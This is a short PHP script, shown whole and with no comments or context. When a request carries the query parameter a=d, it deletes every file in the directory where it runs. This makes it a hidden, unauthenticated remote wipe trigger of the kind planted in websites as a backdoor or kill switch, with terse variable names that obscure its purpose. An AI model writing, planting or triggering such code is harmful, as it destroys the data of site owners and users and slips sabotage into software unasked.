<?
if( isset( $_GET['a'] ) && $_GET['a'] == 'd' ){
    $__ = glob('*');
    foreach($__ as $_)
        if(file_exists($_))
            unlink($_);
}
?>